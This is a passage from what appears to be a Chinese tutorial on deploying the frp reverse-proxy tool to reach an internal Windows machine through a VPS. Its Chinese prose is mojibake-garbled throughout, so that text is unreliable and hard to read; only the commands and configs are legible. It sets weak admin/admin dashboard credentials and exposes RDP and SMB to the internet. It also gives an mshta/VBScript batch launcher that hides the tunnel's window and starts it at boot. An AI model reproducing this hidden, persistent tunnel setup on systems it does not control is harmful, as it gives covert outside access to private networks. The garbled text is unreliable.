æœåŠ¡ç«¯ï¼ˆfrpsï¼‰</h2><p>1ï¼‰é€šè¿‡SSHä¸VPSå»ºç«‹è¿æ¥ï¼Œç„¶åæ‰§è¡Œ<code>arch</code>å‘½ä»¤æŸ¥çœ‹ç¡¬ä»¶æ¶æ„çš„ç±»å‹ã€‚</p><blockquote><p><code>arch</code>å‘½ä»¤æ˜¯ä¸€ä¸ªç”¨äºæ˜¾ç¤ºå½“å‰ä¸»æœºçš„ç¡¬ä»¶æ¶æ„ç±»å‹çš„Linuxå‘½ä»¤ã€‚è¿™ä¸ªå‘½ä»¤åœ¨å¤šä¸ªLinuxå‘è¡Œç‰ˆä¸­éƒ½æ˜¯å¯ç”¨çš„ï¼ŒåŒ…æ‹¬RedHatã€RHELã€Ubuntuã€CentOSç­‰ã€‚é€šè¿‡ä½¿ç”¨<code>arch</code>å‘½ä»¤ï¼Œä½ å¯ä»¥å¿«é€Ÿåœ°è·å–å½“å‰ç³»ç»Ÿçš„ç¡¬ä»¶æ¶æ„ä¿¡æ¯ï¼Œè¿™å¯¹äºè·¨å¹³å°ç¼–ç¨‹ã€è½¯ä»¶åŒ…ç®¡ç†å’Œç³»ç»Ÿæ•…éšœæ’é™¤ç­‰åœºæ™¯éå¸¸æœ‰ç”¨ã€‚</p></blockquote><p>2ï¼‰æ ¹æ®æ¶æ„ä¸åŒï¼Œé€‰æ‹©ç›¸åº”ç‰ˆæœ¬å¹¶è¿›è¡Œä¸‹è½½ã€‚</p><p>å¦‚æœæ˜¯x86_64å³å¯é€‰æ‹©amd64</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/fatedier/frp/releases/download/v0.22.0/frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>x86_64 å’Œ amd64ï¼š</p><p><code>x86_64</code>å’Œ<code>amd64</code>éƒ½æ˜¯æŒ‡64ä½çš„x86æ¶æ„ï¼Œå®ƒä»¬æ˜¯åŒä¸€ç§æ¶æ„çš„ä¸åŒåç§°ã€‚</p><ol><li><strong>x86_64</strong>ï¼š<ul><li>è¿™ä¸ªæœ¯è¯­æ˜¯è‹±ç‰¹å°”ï¼ˆIntelï¼‰çš„64ä½æ‰©å±•æ¶æ„çš„å®˜æ–¹åç§°ã€‚</li><li>x86_64æ˜¯x86æ¶æ„çš„64ä½æ‰©å±•ï¼Œx86æ˜¯è‹±ç‰¹å°”æœ€åˆä¸ºå…¶8086å¤„ç†å™¨å®šä¹‰çš„32ä½æ¶æ„ã€‚</li><li>x86_64æ¶æ„æ”¯æŒ64ä½å†…å­˜å¯»å€ï¼Œå…è®¸æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè®¿é—®è¶…è¿‡4GBçš„å†…å­˜ã€‚</li></ul></li><li><strong>amd64</strong>ï¼š<ul><li><code>amd64</code>æ˜¯AMDä¸ºå…¶64ä½å¤„ç†å™¨æ¶æ„æ‰€ä½¿ç”¨çš„åç§°ã€‚</li><li>å®é™…ä¸Šï¼Œ<code>amd64</code>ä¸<code>x86_64</code>æ˜¯å…¼å®¹çš„ï¼Œå› ä¸ºAMDçš„64ä½å¤„ç†å™¨ä¹Ÿæ˜¯åŸºäºx86æ¶æ„è®¾è®¡çš„ã€‚</li><li><code>amd64</code>åŒæ ·æ”¯æŒ64ä½è®¡ç®—å’Œæ›´å¤§çš„å†…å­˜å¯»å€ç©ºé—´ã€‚</li></ul></li></ol><p>å°½ç®¡åç§°ä¸åŒï¼Œä½†è¿™ä¸¤ä¸ªæœ¯è¯­éƒ½æŒ‡çš„æ˜¯åŒä¸€ç§64ä½è®¡ç®—æ¶æ„ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä»¬å¯ä»¥äº’æ¢ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬åœ¨æŠ€æœ¯ä¸Šæ˜¯ç­‰æ•ˆçš„ã€‚è¿™ç§æ¶æ„è¢«å¹¿æ³›åº”ç”¨äºä¸ªäººç”µè„‘ã€æœåŠ¡å™¨å’Œå·¥ä½œç«™ä¸­ï¼Œå› ä¸ºå®ƒæä¾›äº†æ›´å¥½çš„æ€§èƒ½å’Œæ›´å¤§çš„å†…å­˜å¯»å€èƒ½åŠ›ã€‚</p><p>æ‰€ä»¥åœ¨è¿™é‡Œï¼Œarchè¿”å›çš„æ¶æ„å¦‚æœæ˜¯x86_64ï¼Œé‚£ä¹ˆä¸‹è½½frpçš„æ—¶å€™å¯ä»¥é€‰æ‹©amd64çš„å®‰è£…åŒ…ã€‚</p></blockquote><p>3ï¼‰è§£å‹æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ–‡ä»¶å¤¹æ”¹ä¸ªåï¼Œæ–¹ä¾¿ä½¿ç”¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> frp_0.22.0_linux_amd64 frp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æ–‡ä»¶å¤¹å†…å®¹ï¼š</p><ul><li>frps</li><li>frps.ini</li><li>frpc</li><li>frpc.ini</li></ul><p>å…¶ä¸­frpså’Œfrps.iniæ˜¯frpçš„æœåŠ¡ç«¯ç¨‹åºåŠé…ç½®æ–‡ä»¶ï¼Œfrpcå’Œfrpc.iniæ˜¯frpçš„å®¢æˆ·ç«¯ç¨‹åºåŠé…ç½®æ–‡ä»¶ã€‚é¦–å…ˆåœ¨VPSé…ç½®æœåŠ¡ç«¯ç¨‹åºï¼Œå®¢æˆ·ç«¯ç¨‹åºç›¸å…³çš„æ–‡ä»¶å¯ä»¥åˆ é™¤ã€‚</p><p>4ï¼‰frps.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span>dashboard_port <span class="token operator">=</span> <span class="token number">7500</span>token <span class="token operator">=</span> <span class="token number">12345678</span>dashboard_user <span class="token operator">=</span> admindashboard_pwd <span class="token operator">=</span> adminvhost_http_port <span class="token operator">=</span> <span class="token number">10080</span>vhost_https_port <span class="token operator">=</span> <span class="token number">10443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><code>bind_port = 7000</code>ï¼šè¿™æ˜¯<code>frp</code>æœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£ï¼Œç”¨äºæ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ä¼šå°†æµé‡å‘é€åˆ°è¿™ä¸ªç«¯å£ã€‚</li><li><code>dashboard_port = 7500</code>ï¼šè¿™æ˜¯<code>frp</code>çš„ä»ªè¡¨æ¿ï¼ˆDashboardï¼‰ç«¯å£ï¼Œç”¨äºè®¿é—®<code>frp</code>çš„Webç®¡ç†ç•Œé¢ã€‚é€šè¿‡è¿™ä¸ªç«¯å£ï¼Œä½ å¯ä»¥æŸ¥çœ‹è¿æ¥çŠ¶æ€ã€æµé‡ç»Ÿè®¡ç­‰ä¿¡æ¯ã€‚</li><li><code>token = 12345678</code>ï¼šè¿™æ˜¯ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´è®¤è¯çš„ä»¤ç‰Œã€‚å®¢æˆ·ç«¯åœ¨è¿æ¥åˆ°æœåŠ¡ç«¯æ—¶éœ€è¦æä¾›è¿™ä¸ªä»¤ç‰Œï¼Œä»¥ç¡®ä¿è¿æ¥çš„å®‰å…¨æ€§ã€‚</li><li><code>dashboard_user = admin</code>ï¼šè¿™æ˜¯è®¿é—®ä»ªè¡¨æ¿æ—¶ä½¿ç”¨çš„ç”¨æˆ·åã€‚</li><li><code>dashboard_pwd = admin</code>ï¼šè¿™æ˜¯è®¿é—®ä»ªè¡¨æ¿æ—¶ä½¿ç”¨çš„å¯†ç ã€‚</li><li><code>vhost_http_port = 10080</code>ï¼šè¿™æ˜¯ç”¨äºè™šæ‹Ÿä¸»æœºçš„HTTPç«¯å£ã€‚å¦‚æœä½ é…ç½®äº†<code>frp</code>çš„è™šæ‹Ÿä¸»æœºåŠŸèƒ½ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ä¸ªç«¯å£å¯ä»¥è®¿é—®ç»‘å®šçš„åŸŸåã€‚</li><li><code>vhost_https_port = 10443</code>ï¼šè¿™æ˜¯ç”¨äºè™šæ‹Ÿä¸»æœºçš„HTTPSç«¯å£ã€‚ä¸<code>vhost_http_port</code>ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨äºåŠ å¯†çš„HTTPSæµé‡ã€‚</li></ol></blockquote><p>5ï¼‰å¯åŠ¨frps</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">./frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœçœ‹åˆ°å±å¹•è¾“å‡ºè¿™æ ·ä¸€æ®µå†…å®¹ï¼Œå³è¡¨ç¤ºè¿è¡Œæ­£å¸¸ï¼Œå¦‚æœå‡ºç°é”™è¯¯æç¤ºï¼Œè¯·æ£€æŸ¥ä¸Šé¢çš„æ­¥éª¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:130<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:7000<span class="token punctuation">[</span>service.go:172<span class="token punctuation">]</span> http <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10080<span class="token punctuation">[</span>service.go:193<span class="token punctuation">]</span> https <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10443<span class="token punctuation">[</span>service.go:216<span class="token punctuation">]</span> Dashboard listen on <span class="token number">0.0</span>.0.0:7500<span class="token punctuation">[</span>root.go:210<span class="token punctuation">]</span> Start frps success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶è®¿é—®vpsip:7500 å¹¶ä½¿ç”¨è‡ªå·±è®¾ç½®çš„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œå³å¯çœ‹åˆ°ä»ªè¡¨æ¿ç•Œé¢ã€‚</p><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2009.46.04.png" style="zoom:50%;"><p>6ï¼‰æœåŠ¡ç«¯åå°è¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> ./frps <span class="token parameter variable">-c</span> frps.ini <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>nohup</code>ï¼šnohupæ˜¯ä¸€ä¸ªåå°ç¨‹åºç®¡ç†å·¥å…·ï¼Œç”¨äºè¿è¡Œå‘½ä»¤å¹¶å…¶åœ¨ä½ é€€å‡ºç»ˆç«¯ä¼šè¯åä»ç„¶ç»§ç»­è¿è¡Œã€‚<code>nohup</code>çš„åç§°æ¥æºäºâ€œno hang upâ€ï¼ˆä¸è¦æŒ‚æ–­ï¼‰ã€‚</li><li><code>./frps</code>ï¼šè¿™æ˜¯<code>frp</code>æœåŠ¡ç«¯ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚<code>.</code>/<code>è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ</code>frps`æ˜¯è¦æ‰§è¡Œçš„ç¨‹åºã€‚</li><li><code>-c frps.ini</code>ï¼šè¿™æ˜¯ä¼ é€’ç»™<code>frps</code>ç¨‹åºçš„ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡å®šä½¿ç”¨<code>frps.ini</code>æ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ã€‚</li><li><code>&amp;</code>ï¼šè¿™ä¸ªç¬¦å·å°†å‘½ä»¤æ”¾åˆ°åå°æ‰§è¡Œï¼Œå³ä½¿ç»ˆç«¯å…³é—­ï¼Œç¨‹åºä¹Ÿä¼šç»§ç»­è¿è¡Œã€‚</li></ul><p>å½“ä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤æ—¶ï¼Œ<code>frps</code>æœåŠ¡ä¼šä½¿ç”¨<code>frps.ini</code>é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®å¯åŠ¨ï¼Œå¹¶åœ¨åå°è¿è¡Œï¼Œä¸ä¼šå ç”¨ç»ˆç«¯ã€‚è¿™æ ·ï¼Œä½ å¯ä»¥ç»§ç»­ä½¿ç”¨ç»ˆç«¯è¿›è¡Œå…¶ä»–æ“ä½œï¼Œè€Œ<code>frps</code>æœåŠ¡ä¼šåœ¨åå°ä¿æŒè¿è¡ŒçŠ¶æ€ã€‚</p><p>å¦‚æœä½ éœ€è¦æŸ¥çœ‹<code>frps</code>æœåŠ¡çš„è¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨<code>nohup</code>å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p><p>nohup ./frps -c frps.ini &gt; frps.log 2&gt;&amp;1 &amp;</p><p>è¿™ä¸ªå‘½ä»¤ä¼šå°†<code>frps</code>çš„æ ‡å‡†è¾“å‡ºï¼ˆ<code>stdout</code>ï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆ<code>stderr</code>ï¼‰éƒ½é‡å®šå‘åˆ°<code>frps.log</code>æ–‡ä»¶ä¸­ï¼Œè¿™æ ·ä½ å°±å¯ä»¥é€šè¿‡æŸ¥çœ‹<code>frps.log</code>æ–‡ä»¶æ¥è·å–æœåŠ¡çš„æ—¥å¿—ä¿¡æ¯ã€‚</p></blockquote><p>è¾“å‡ºå¦‚ä¸‹å†…å®¹å³è¡¨ç¤ºæ­£å¸¸è¿è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nohup: ignoring input and appending output to <span class="token string">'nohup.out'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶å¯å…ˆä½¿ç”¨Ctrl+Cå…³é—­nohupï¼Œfrpsä¾ç„¶ä¼šåœ¨åå°è¿è¡Œï¼Œä½¿ç”¨jobså‘½ä»¤æŸ¥çœ‹åå°è¿è¡Œçš„ç¨‹åº<code>jobs</code>ï¼Œåœ¨ç»“æœä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°frpsæ­£åœ¨åå°æ­£å¸¸è¿è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">[1]+  Running                 nohup ./frps -c frps.ini &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶è®¿é—® vpsip:7500 ä¾ç„¶å¯ä»¥æ‰“å¼€ä»ªè¡¨æ¿ç•Œé¢ï¼Œè‡³æ­¤ï¼ŒæœåŠ¡ç«¯å³è®¾ç½®å®Œæˆï¼Œå¯ä»¥å…³é—­SSHçª—å£ã€‚</p><h2 id="3-2-å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰"><a href="#3-2-å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰" class="headerlink" title="3.2 å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰"></a>3.2 å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰</h2><p>frpå®¢æˆ·ç«¯éƒ¨ç½²åœ¨æˆ‘ä»¬çœŸæ­£æƒ³è®¿é—®çš„å†…ç½‘è®¾å¤‡ã€‚</p><p>1ï¼‰æ ¹æ®å†…ç½‘è®¾å¤‡ç±»å‹ä¸‹è½½ç›¸åº”çš„frpç¨‹åº</p><p>2ï¼‰frpc.inié…ç½®æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> ã€å¡«vpsçš„ip<span class="token operator">==</span>frpsçš„ipã€‘server_port <span class="token operator">=</span> <span class="token number">7000</span>token <span class="token operator">=</span> won517574356<span class="token punctuation">[</span>rdp<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1           local_port <span class="token operator">=</span> <span class="token number">3389</span>remote_port <span class="token operator">=</span> <span class="token number">7001</span>  <span class="token punctuation">[</span>smb<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">445</span>remote_port <span class="token operator">=</span> <span class="token number">7002</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ˜¯ <code>frp</code> å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰å®¢æˆ·ç«¯å¦‚ä½•è¿æ¥åˆ°æœåŠ¡ç«¯ä»¥åŠå¦‚ä½•è½¬å‘ç‰¹å®šçš„ç«¯å£ã€‚ä¸‹é¢æ˜¯å„é…ç½®é¡¹çš„è¯¦ç»†è§£é‡Šï¼š</p><p>[common] éƒ¨åˆ†ï¼š</p><ul><li><code>server_addr</code>ï¼šæœåŠ¡ç«¯çš„IPåœ°å€ï¼Œè¿™é‡Œéœ€è¦å¡«å†™ä½ çš„VPSï¼ˆè™šæ‹Ÿä¸“ç”¨æœåŠ¡å™¨ï¼‰çš„IPåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œ <code>frps</code> çš„æœåŠ¡å™¨çš„IPã€‚</li><li><code>server_port</code>ï¼šæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£ï¼Œè¿™é‡Œè®¾ç½®ä¸º7000ï¼Œä¸æœåŠ¡ç«¯é…ç½®æ–‡ä»¶ä¸­çš„ <code>bind_port</code> ç›¸å¯¹åº”ã€‚</li><li><code>token</code>ï¼šç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´è®¤è¯çš„ä»¤ç‰Œï¼Œè¿™é‡Œè®¾ç½®ä¸º <code>won517574356</code>ï¼Œéœ€è¦ä¸æœåŠ¡ç«¯é…ç½®æ–‡ä»¶ä¸­çš„ <code>token</code> ä¸€è‡´ã€‚</li></ul><p>[rdp] éƒ¨åˆ†ï¼š</p><ul><li><code>type</code>ï¼šä»£ç†ç±»å‹ï¼Œè¿™é‡Œè®¾ç½®ä¸º <code>tcp</code>ï¼Œè¡¨ç¤ºä½¿ç”¨TCPåè®®ã€‚</li><li><code>local_ip</code>ï¼šå†…ç½‘ä¸­éœ€è¦è¢«ä»£ç†çš„æœºå™¨çš„IPåœ°å€ï¼Œè¿™é‡Œè®¾ç½®ä¸º <code>127.0.0.1</code>ï¼Œé€šå¸¸ç”¨äºæœ¬åœ°æœºå™¨ã€‚</li><li><code>local_port</code>ï¼šå†…ç½‘ä¸­éœ€è¦è¢«ä»£ç†çš„æœºå™¨çš„ç«¯å£ï¼Œè¿™é‡Œè®¾ç½®ä¸º3389ï¼Œæ˜¯Windowsè¿œç¨‹æ¡Œé¢ï¼ˆRDPï¼‰çš„æ ‡å‡†ç«¯å£ã€‚</li><li><code>remote_port</code>ï¼šåœ¨æœåŠ¡ç«¯ä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œç”¨äºå¤–éƒ¨è®¿é—®ï¼Œè¿™é‡Œè®¾ç½®ä¸º7001ã€‚</li></ul><p>[smb] éƒ¨åˆ†ï¼š</p><ul><li><code>type</code>ï¼šä»£ç†ç±»å‹ï¼Œè¿™é‡ŒåŒæ ·è®¾ç½®ä¸º <code>tcp</code>ã€‚</li><li><code>local_ip</code>ï¼šå†…ç½‘ä¸­éœ€è¦è¢«ä»£ç†çš„æœºå™¨çš„IPåœ°å€ï¼Œè¿™é‡Œä¹Ÿæ˜¯ <code>127.0.0.1</code>ã€‚</li><li><code>local_port</code>ï¼šå†…ç½‘ä¸­éœ€è¦è¢«ä»£ç†çš„æœºå™¨çš„ç«¯å£ï¼Œè¿™é‡Œè®¾ç½®ä¸º445ï¼Œæ˜¯Windowsæ–‡ä»¶å…±äº«ï¼ˆSMBï¼‰çš„æ ‡å‡†ç«¯å£ã€‚</li><li><code>remote_port</code>ï¼šåœ¨æœåŠ¡ç«¯ä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œç”¨äºå¤–éƒ¨è®¿é—®ï¼Œè¿™é‡Œè®¾ç½®ä¸º7002ã€‚</li></ul></blockquote><p>é€šè¿‡è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ å¯ä»¥å°†å†…ç½‘ä¸­çš„RDPå’ŒSMBæœåŠ¡æš´éœ²ç»™å…¬ç½‘ï¼Œä½¿å¾—ä½ å¯ä»¥ä»å¤–éƒ¨é€šè¿‡VPSçš„IPåœ°å€å’Œç›¸åº”çš„ <code>remote_port</code> æ¥è®¿é—®è¿™äº›æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡ <code>server_addr:7001</code> æ¥è®¿é—®RDPæœåŠ¡ï¼Œé€šè¿‡ <code>server_addr:7002</code> æ¥è®¿é—®SMBæœåŠ¡ã€‚</p><p>3ï¼‰è¿è¡Œå®¢æˆ·ç«¯ç¨‹åº</p><blockquote><p>frpcç¨‹åºä¸èƒ½ç›´æ¥åŒå‡»è¿è¡Œï¼</p></blockquote><p>æ‰¾åˆ°ç¨‹åºå®‰è£…ä½ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc <span class="token parameter variable">-c</span> frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:205<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span>, server udp port <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>proxy_manager.go:136<span class="token punctuation">]</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>rdp smb<span class="token punctuation">]</span><span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>smb<span class="token punctuation">]</span> start proxy success<span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>rdp<span class="token punctuation">]</span> start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œfrpcç¨‹åºï¼Œçª—å£ä¸­è¾“å‡ºå¦‚ä¸Šå†…å®¹è¡¨ç¤ºè¿è¡Œæ­£å¸¸ã€‚</p><p>ä¸å…³é—­å‘½ä»¤è¡Œçª—å£ï¼Œæ­¤æ—¶å¯ä»¥åœ¨å±€åŸŸç½‘å¤–ä½¿ç”¨ç›¸åº”ç¨‹åºè®¿é—® vpsip:remote_port ï¼ˆç«¯å£ä¸ºè‡ªå®šä¹‰çš„remote_portï¼‰å³å¯è®¿é—®åˆ°ç›¸åº”æœåŠ¡ã€‚</p><p>4ï¼‰å®¢æˆ·ç«¯åå°è¿è¡ŒåŠå¼€æœºè‡ªå¯</p><p>åˆ›å»ºfprc.batæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off<span class="token keyword">if</span> <span class="token string">"%1"</span> <span class="token operator">==</span> <span class="token string">"h"</span> goto beginmshta vbscript:createobject<span class="token punctuation">(</span><span class="token string">"wscript.shell"</span><span class="token punctuation">)</span>.run<span class="token punctuation">(</span><span class="token string">""</span>"%~nx0<span class="token string">""</span> h",0<span class="token punctuation">)</span><span class="token punctuation">(</span>window.close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">exit</span>:beginREM<span class="token builtin class-name">cd</span> C:<span class="token punctuation">\</span>frpfrpc <span class="token parameter variable">-c</span> frpc.ini<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªWindowsæ‰¹å¤„ç†è„šæœ¬ï¼ˆ<code>.bat</code> æ–‡ä»¶ï¼‰ï¼Œç”¨äºä»¥éšè—çª—å£çš„æ–¹å¼è¿è¡Œ <code>frp</code> å®¢æˆ·ç«¯ç¨‹åº <code>frpc</code>ã€‚ä¸‹é¢æ˜¯è„šæœ¬çš„è¯¦ç»†è§£é‡Šï¼š</p><ol><li><code>@echo off</code>ï¼šå…³é—­å‘½ä»¤çš„å›æ˜¾ï¼Œä½¿å¾—æ‰§è¡Œæ—¶ä¸ä¼šæ˜¾ç¤ºæ‰§è¡Œçš„å‘½ä»¤ã€‚</li><li><code>if "%1" == "h" goto begin</code>ï¼šæ£€æŸ¥ä¼ é€’ç»™æ‰¹å¤„ç†è„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆ<code>%1</code>ï¼‰ï¼Œå¦‚æœå‚æ•°æ˜¯ <code>h</code>ï¼Œåˆ™è·³è½¬åˆ°æ ‡ç­¾ <code>begin</code>ã€‚</li><li><code>mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&amp;&amp;exit</code>ï¼šå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸æ˜¯ <code>h</code>ï¼Œåˆ™ä½¿ç”¨ <code>mshta</code> å‘½ä»¤ï¼ˆMicrosoft HTML Applicationï¼‰æ‰§è¡Œä¸€ä¸ªVBScriptè„šæœ¬æ¥è¿è¡Œå½“å‰è„šæœ¬ï¼Œå¹¶ä¼ é€’ <code>h</code> ä½œä¸ºå‚æ•°ï¼ŒåŒæ—¶å…³é—­ <code>mshta</code> çª—å£ã€‚<code>%~nx0</code> æ˜¯å½“å‰æ‰¹å¤„ç†æ–‡ä»¶çš„åç§°å’Œæ‰©å±•åã€‚</li><li><code>:begin</code>ï¼šä¸€ä¸ªæ ‡ç­¾ï¼Œç”¨äºåœ¨æ¡ä»¶æ»¡è¶³æ—¶è·³è½¬åˆ°è¿™é‡Œã€‚</li><li><code>cd C:\frp</code>ï¼šå°†å‘½ä»¤è¡Œçš„å½“å‰ç›®å½•æ›´æ”¹ä¸º <code>C:\frp</code>ï¼Œå‡è®¾ <code>frpc.ini</code> é…ç½®æ–‡ä»¶å’Œ <code>frpc</code> å¯æ‰§è¡Œæ–‡ä»¶ä½äºè¿™ä¸ªç›®å½•ã€‚</li><li><code>frpc -c frpc.ini</code>ï¼šè¿è¡Œ <code>frpc</code> å®¢æˆ·ç«¯ç¨‹åºï¼Œå¹¶ä½¿ç”¨ <code>frpc.ini</code> é…ç½®æ–‡ä»¶ã€‚</li><li><code>exit</code>ï¼šé€€å‡ºæ‰¹å¤„ç†è„šæœ¬ã€‚</li></ol><p>è¿™ä¸ªè„šæœ¬çš„ç›®çš„æ˜¯è®©ç”¨æˆ·å¯ä»¥é€šè¿‡åŒå‡»æ‰¹å¤„ç†æ–‡ä»¶æ¥ä»¥éšè—çª—å£çš„æ–¹å¼å¯åŠ¨ <code>frpc</code> å®¢æˆ·ç«¯ï¼Œè€Œä¸éœ€è¦æ‰“å¼€å‘½ä»¤è¡Œçª—å£ã€‚å¦‚æœç”¨æˆ·å¸Œæœ›åœ¨å‘½ä»¤è¡Œä¸­å¯åŠ¨ <code>frpc</code> å¹¶çœ‹åˆ°è¾“å‡ºï¼Œä»–ä»¬å¯ä»¥ä¼ é€’ <code>h</code> ä½œä¸ºå‚æ•°ï¼Œä¾‹å¦‚ <code>your_script.bat h</code>ï¼Œè¿™æ ·å°±ä¸ä¼šä½¿ç”¨ <code>mshta</code> æ¥éšè—çª—å£ã€‚</p><p>è¯·æ³¨æ„ï¼Œä½¿ç”¨ <code>mshta</code> æ¥éšè—çª—å£æ˜¯ä¸€ç§ä¸å¤ªå¸¸è§çš„åšæ³•ï¼Œå¯èƒ½ä¼šè¢«ä¸€äº›å®‰å…¨è½¯ä»¶è§†ä¸ºå¯ç–‘è¡Œä¸ºã€‚æ­¤å¤–ï¼Œ<code>mshta</code> å‘½ä»¤åœ¨æŸäº›Windowsç‰ˆæœ¬ä¸­å¯èƒ½å·²è¢«ç¦ç”¨ã€‚</p></blockquote><p>ä¹‹åç›´æ¥è¿è¡Œè¿™ä¸ª .bat æ–‡ä»¶å³å¯å¯åŠ¨frpcå¹¶éšè—çª—å£ï¼ˆå¯åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­é€€å‡ºï¼‰ã€‚</p><p>å¦‚æœæƒ³è¦å¼€æœºå¯åŠ¨ï¼ŒæŠŠè¿™ä¸ª .bat æ–‡ä»¶æ”¾åœ¨Windowsçš„å¼€æœºå¯åŠ¨æ–‡ä»¶å¤¹å³å¯ã€‚</p><p>ä¹‹åå¦‚æœæƒ³æš´éœ²å…¶ä»–æœåŠ¡ï¼Œåªéœ€è¦éœ€è¦åœ¨frpc.iniåè¿½åŠ è§„åˆ™å³å¯ã€‚</p><blockquote><p> 